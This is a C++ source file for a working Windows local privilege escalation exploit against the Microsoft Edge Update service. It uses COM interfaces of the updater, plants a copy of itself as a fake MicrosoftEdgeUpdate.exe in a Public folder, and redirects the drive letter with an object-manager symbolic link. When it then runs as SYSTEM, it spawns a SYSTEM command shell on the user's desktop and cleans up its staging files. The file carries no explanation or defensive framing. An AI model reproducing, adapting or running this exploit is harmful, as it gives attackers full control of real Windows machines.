#include <stdio.h>
#include <windows.h>
#include <hstring.h>
#include <cstdio>
#include <cstdlib>
#include <iostream>
#include <string>
#include <string.h>
#include <windows.h>
#include <strsafe.h>
#include <comutil.h>
#include <winerror.h>
#include <wrl/client.h>
#include <utility>
#include <Aclapi.h>
#include <bluetoothapis.h>
#include <userenv.h>
#include <Wtsapi32.h>
#include <iostream>
#include <atlconv.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <sddl.h>
#include <StrSafe.h>
#include "Shlobj.h"
#include <atlstr.h>
#include<tchar.h>
#include <vector>
#pragma comment(lib, "ntdll.lib")
#pragma comment (lib,"Advapi32.lib")
#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "Userenv.lib")

#pragma warning(disable:4996)

using namespace std;


class __declspec(uuid("ddd4b5d4-fd54-497c-8789-0830f29a60ee")) IGoogleUpdate3 : public IDispatch {
public:
    virtual HRESULT __stdcall Proc7(/* Stack Offset: 4 */ int64_t* p0);
    virtual HRESULT __stdcall Proc8(/* Stack Offset: 4 */ int64_t p0, /* Stack Offset: 8 */ IDispatch** p1);
    virtual HRESULT __stdcall Proc9(/* Stack Offset: 4 */ IDispatch** p0);
};


class __declspec(uuid("837e40da-eb1b-440c-8623-0f14df158dc0")) IAppBundleWeb : public IDispatch {
public:
    virtual HRESULT __stdcall Proc7(/* Stack Offset: 4 */ BSTR p0, /* Stack Offset: 8 */ BSTR p1, /* Stack Offset: 12 */ BSTR p2, /* Stack Offset: 16 */ BSTR p3);
    virtual HRESULT __stdcall createInstalledApp(/* Stack Offset: 4 */ BSTR p0);
    virtual HRESULT __stdcall Proc9();
    virtual HRESULT __stdcall Proc10(/* Stack Offset: 4 */ BSTR* p0);
    virtual HRESULT __stdcall Proc11(/* Stack Offset: 4 */ BSTR p0);
    virtual HRESULT __stdcall Proc12(/* Stack Offset: 4 */ int64_t p0);
    virtual HRESULT __stdcall Proc13(/* Stack Offset: 4 */ int64_t* p0);
    virtual HRESULT __stdcall get_appWeb(/* Stack Offset: 4 */ int64_t p0, /* Stack Offset: 8 */ IDispatch** p1);
    virtual HRESULT __stdcall initialize();
    virtual HRESULT __stdcall checkForUpdate();
    virtual HRESULT __stdcall Proc17();
    virtual HRESULT __stdcall Proc18();
    virtual HRESULT __stdcall Proc19();
    virtual HRESULT __stdcall Proc20();
    virtual HRESULT __stdcall cancel();
    virtual HRESULT __stdcall Proc22(/* Stack Offset: 4 */ BSTR p0, /* Stack Offset: 8 */ BSTR p1);
    virtual HRESULT __stdcall Proc23(/* Stack Offset: 4 */ VARIANT* p0);
};

class __declspec(uuid("3a49f783-1c7d-4d35-8f63-5c1c206b9b6e")) IAppWeb : public IDispatch {
public:
    virtual HRESULT __stdcall Proc7(/* Stack Offset: 4 */ BSTR* p0);
    virtual HRESULT __stdcall Proc8(/* Stack Offset: 4 */ IDispatch** p0);
    virtual HRESULT __stdcall Proc9(/* Stack Offset: 4 */ IDispatch** p0);
    virtual HRESULT __stdcall get_command(/* Stack Offset: 4 */ BSTR p0, /* Stack Offset: 8 */ IDispatch** p1);
    virtual HRESULT __stdcall Proc11();
    virtual HRESULT __stdcall get_currentState(/* Stack Offset: 4 */ IDispatch** p0);
    virtual HRESULT __stdcall Proc13();
    virtual HRESULT __stdcall Proc14();
    virtual HRESULT __stdcall Proc15(/* Stack Offset: 4 */ BSTR* p0);
    virtual HRESULT __stdcall Proc16(/* Stack Offset: 4 */ BSTR p0);
};


class __declspec(uuid("6dffe7fe-3153-4af1-95d8-f8fcca97e56b")) IGoogleUpdate3Web : public IDispatch {
public:
    virtual HRESULT __stdcall createAppBundleWeb(/* Stack Offset: 4 */ IDispatch** p0);
};
IUnknown* p2;
IGoogleUpdate3Web* pIGoogleUpdate3Web;
IDispatch* p;
UUID clsid;

HANDLE SymlinkHandle;
wchar_t SymbolicLinkName[MAX_PATH] = { 0 };
wchar_t TargetName[MAX_PATH] = { 0 };
wchar_t FakeFileName[MAX_PATH] = { 0 };
wchar_t FakeFileName2[MAX_PATH] = { 0 };

wchar_t buffer[MAX_PATH] = { 0 };
wchar_t EdgeUpdatepath[MAX_PATH] = { 0 };
WCHAR szModule[MAX_PATH];



extern "C" int NTAPI NtCreateSymbolicLinkObject(OUT PHANDLE           SymbolicLinkHandle,
    IN ACCESS_MASK        DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PUNICODE_STRING    TargetName);

#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)


BOOL FindFILE(wchar_t Dir[MAX_PATH], wchar_t File[MAX_PATH], wchar_t path2[MAX_PATH])
{
    WIN32_FIND_DATA FindFileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    wchar_t DirSpec[MAX_PATH];
    StringCchCopy(DirSpec, MAX_PATH, Dir);
    StringCchCat(DirSpec, MAX_PATH, TEXT("\\*"));

    hFind = FindFirstFile(DirSpec, &FindFileData);
    if (hFind == INVALID_HANDLE_VALUE)
    {
        FindClose(hFind);
    }
    else
    {
        while (FindNextFile(hFind, &FindFileData) != 0)
        {
            if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0 && wcscmp(FindFileData.cFileName, L".") == 0 || wcscmp(FindFileData.cFileName, L"..") == 0)        //判断是文件夹&&表示为"."||表示为"."
            {
                continue;
            }
            if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
            {

                wchar_t DirAdd[MAX_PATH];
                StringCchCopy(DirAdd, MAX_PATH, Dir);
                StringCchCat(DirAdd, MAX_PATH, TEXT("\\"));
                StringCchCat(DirAdd, MAX_PATH, FindFileData.cFileName);

                if (FindFILE(DirAdd, File, path2) == 1)
                {
                    return 1;
                }
            }

            if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
            {
                if (!wcscmp(FindFileData.cFileName, File))
                {
                    wcscpy(path2, Dir);
                    wcscat(path2, L"\\");
                    wcscat(path2, FindFileData.cFileName);
                    return 1;
                }
            }
        }
        FindClose(hFind);
    }

    return 0;
}


HANDLE CreateSymlink(HANDLE hRoot, LPCWSTR SymbolicLinkName, LPCWSTR TargetName) {
    HANDLE SymbolicLinkHandle = NULL;
    UNICODE_STRING TargetObjectName = { 0 };
    OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
    UNICODE_STRING SymbolicLinkObjectName = { 0 };

    RtlInitUnicodeString(&SymbolicLinkObjectName, SymbolicLinkName);
    RtlInitUnicodeString(&TargetObjectName, TargetName);

    InitializeObjectAttributes(&ObjectAttributes,
        &SymbolicLinkObjectName,
        OBJ_CASE_INSENSITIVE,
        hRoot,
        NULL);

    int NtStatus = NtCreateSymbolicLinkObject(&SymbolicLinkHandle,
        SYMBOLIC_LINK_ALL_ACCESS,
        &ObjectAttributes,
        &TargetObjectName);

    if (NtStatus != 0) {
        printf("[-] Failed to open object directory: 0x%X\n", NtStatus);
        getchar();
    }
    return SymbolicLinkHandle;
}


BOOL ok = NULL;


VOID GetFilePath() {


    HKEY hKey;
    ULONG ret = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\edgeupdate", 0,
        MAXIMUM_ALLOWED, &hKey);

    ULONG type = REG_SZ;
    ULONG size = 256;
    RegQueryValueExW(hKey, L"ImagePath", NULL, &type, (LPBYTE)EdgeUpdatepath, &size);

    for (size_t i = wcslen(EdgeUpdatepath); i > 0; i--)
    {
        if (EdgeUpdatepath[i] == '/')
        {
            EdgeUpdatepath[i] = 0;
            break;
        }
    }

    for (size_t i = 0; i < wcslen(EdgeUpdatepath); i++)
    {
        if (EdgeUpdatepath[i] == ':')
        {
            buffer[0] = EdgeUpdatepath[i - 1];
            buffer[1] = EdgeUpdatepath[i];
            wcscat(FakeFileName2, buffer);
            wcscat(FakeFileName2, L"\\Users\\Public\\test");
            wcscat(FakeFileName, FakeFileName2);
            CreateDirectoryW(FakeFileName2, 0);
        }
        else  if (EdgeUpdatepath[i] == '\\')
        {
            for (size_t j = i + 1; j < wcslen(EdgeUpdatepath); j++)
            {
                if (EdgeUpdatepath[j] == '\\')
                {
                    EdgeUpdatepath[j] = NULL;
                    wcscat(FakeFileName, &EdgeUpdatepath[i]);
                    EdgeUpdatepath[j] = '\\';
                    CreateDirectoryW(FakeFileName, 0);
                    i = j;
                }
            }
        }
    }

    wcscat(FakeFileName, L"\\MicrosoftEdgeUpdate.exe");
    printf("[+] 2 \n");

    wcscat(SymbolicLinkName, L"\\??\\");
    wcscat(SymbolicLinkName, buffer);

    wcscat(TargetName, L"\\GLOBAL??\\");
    wcscat(TargetName, buffer);
    wcscat(TargetName, L"\\Users\\Public\\test");

    GetModuleFileNameW(NULL, szModule, MAX_PATH);

    CopyFileW(szModule, FakeFileName, FALSE);


}
ULONG   th() {

    CoInitializeEx(NULL, COINIT_MULTITHREADED);

    CLSIDFromString(L"{EA92A799-267E-4DF5-A6ED-6A7E0684BB8A}", &clsid);

    while (true)
    {
    to: HRESULT hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, __uuidof(pIGoogleUpdate3Web), (LPVOID*)&pIGoogleUpdate3Web);
        Microsoft::WRL::ComPtr<IDispatch> dispatch;
        Microsoft::WRL::ComPtr<IAppWeb> app;
        Microsoft::WRL::ComPtr<IDispatch> bundle_dispatch;
        if (hr == S_OK)
        {

            hr = pIGoogleUpdate3Web->createAppBundleWeb(&bundle_dispatch);
            if (FAILED(hr)) {
                printf("createAppBundleWeb failed [0x%x]\n", hr);
                goto to;
            }

            Microsoft::WRL::ComPtr<IAppBundleWeb> bundle;
            hr = bundle_dispatch->QueryInterface(__uuidof(IAppBundleWeb), &bundle);
            if (FAILED(hr)) {
                printf("bundle_dispatch.QueryInterface failed [0x%x]\n", hr);
                goto to;
            }


            hr = bundle->initialize();
            if (FAILED(hr)) {
                printf("bundle->initialize failed [0x%x]\n", hr);
                goto to;
            }

            bundle->cancel();

            hr = bundle->createInstalledApp(SysAllocString(L"{56EB18F8-B008-4CBD-B6D2-8C97FE7E9062}"));
            if (FAILED(hr)) {
                hr = bundle->createInstalledApp(SysAllocString(L"{F3C4FE00-EFD5-403B-9569-398A20F1BA4A}"));
                if (FAILED(hr)) {
                    hr = bundle->createInstalledApp(SysAllocString(L"{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}"));
                    if (FAILED(hr)) {
                        hr = bundle->createInstalledApp(SysAllocString(L"{0D50BFEC-CD6A-4F9A-964C-C7416E3ACB10}"));
                        if (FAILED(hr)) {
                            hr = bundle->createInstalledApp(SysAllocString(L"{65C35B14-6C1D-4122-AC46-7148CC9D6497}"));
                            if (FAILED(hr)) {
                                hr = bundle->createInstalledApp(SysAllocString(L"{2CD8A007-E189-409D-A2C8-9AF4EF3C72AA}"));
                                if (FAILED(hr)) {
                                 //   wprintf(_T("bundle->createInstalledApp failed [0x%x]\n"), hr);
                                    goto to;
                                }
                            }
                        }
                    }
                }
            }

            bundle->checkForUpdate();
            bundle->cancel();
            SymlinkHandle = CreateSymlink(NULL, SymbolicLinkName, TargetName);
            if (!SymlinkHandle)
            {
                printf("SymlinkHandle Error ");
                exit(-1);
            }
            return 0;
        }
        else
        {
            printf("CoCreateInstance Error %x ", hr);
        }
    }

}

void TraverseDirectory(wchar_t Dir[MAX_PATH])
{
    WIN32_FIND_DATA FindFileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    wchar_t DirSpec[MAX_PATH];
    DWORD dwError;
    StringCchCopy(DirSpec, MAX_PATH, Dir);
    StringCchCat(DirSpec, MAX_PATH, TEXT("\\*"));

    hFind = FindFirstFile(DirSpec, &FindFileData);

    if (hFind == INVALID_HANDLE_VALUE)
    {
        FindClose(hFind);
    }
    else
    {
        while (FindNextFile(hFind, &FindFileData) != 0)
        {
            if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0 && wcscmp(FindFileData.cFileName, L".") == 0 || wcscmp(FindFileData.cFileName, L"..") == 0)        //判断是文件夹&&表示为"."||表示为"."
            {
                continue;
            }
            if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
            {

                wchar_t DirAdd[MAX_PATH];
                StringCchCopy(DirAdd, MAX_PATH, Dir);
                StringCchCat(DirAdd, MAX_PATH, TEXT("\\"));
                StringCchCat(DirAdd, MAX_PATH, FindFileData.cFileName);
                TraverseDirectory(DirAdd);
                RemoveDirectoryW(DirAdd);
            }

            if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
            {
                WCHAR path[1000] = { 0 };
                wcscpy(path, Dir);
                wcscat(path, L"\\");
                wcscat(path, FindFileData.cFileName);
                DeleteFile(path);
            }
        }
        FindClose(hFind);
    }

    return;
}

void RunRemoteControl()
{
    HANDLE ProcessHandle = NULL;
    HANDLE CurrentToken = NULL;
    HANDLE TokenDup = NULL;
    wstring wOpenProcessName;

    ProcessHandle = GetCurrentProcess();
    if (!OpenProcessToken(ProcessHandle, TOKEN_ALL_ACCESS, &CurrentToken))
    {
        return;
    }
    if (!DuplicateTokenEx(CurrentToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &TokenDup))
    {
        return;
    }
    DWORD dwSessionID = WTSGetActiveConsoleSessionId();
    if (!SetTokenInformation(TokenDup, TokenSessionId, &dwSessionID, sizeof(DWORD)))
    {
        return;
    }
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFO);
    si.lpDesktop = (LPWSTR)L"WinSta0\\Default";

    LPVOID pEnv = NULL;
    DWORD dwCreationFlags = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT;
    if (!CreateEnvironmentBlock(&pEnv, TokenDup, FALSE))
    {
        return;
    }

    wchar_t cmdpath[MAX_PATH] = { 0 };
    wchar_t WinPath[MAX_PATH] = { 0 };

    if (!GetEnvironmentVariableW(L"SYSTEMROOT", WinPath, MAX_PATH))
    {
        return;
    }

    wcscat(cmdpath, WinPath);
    wcscat(cmdpath, L"\\system32\\cmd.exe");

    if (!CreateProcessAsUserW(TokenDup, cmdpath, (LPWSTR)L" /k cd ..\\..\\..\\..", NULL, NULL, FALSE, dwCreationFlags, pEnv, NULL, &si, &pi))
    {
        return;
    }
}

int main(int argc, char* argv[]) {

    HKEY hk;
    ULONG ret = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\Fax", 0,
        KEY_ALL_ACCESS, &hk);
    if (ret == ERROR_SUCCESS)
    {
        RunRemoteControl();
        CreateFileW(L"\\\\.\\Pipe\\mypipe", GENERIC_READ | GENERIC_WRITE, 0,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        exit(-1);
    }
    else
    {
        printf("[+] 1\n");

        GetFilePath();

        printf("[+] 3\n");

        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)th, 0, 0, 0);

        HANDLE hPipe = CreateNamedPipe(L"\\\\.\\Pipe\\mypipe", PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT
            , PIPE_UNLIMITED_INSTANCES, 0, 0, NMPWAIT_WAIT_FOREVER, 0);

        if (ConnectNamedPipe(hPipe, NULL) != NULL)
        {
            printf("[+] The exploit was successful\n");
            CloseHandle(SymlinkHandle);
            Sleep(100);
            wchar_t FakeFileName[MAX_PATH] = { 0 };
            wcscat(FakeFileName, buffer);
            wcscat(FakeFileName, L"\\Users\\Public\\test");
            TraverseDirectory(FakeFileName);
            RemoveDirectoryW(FakeFileName);

        }
    }

    return 0;
}
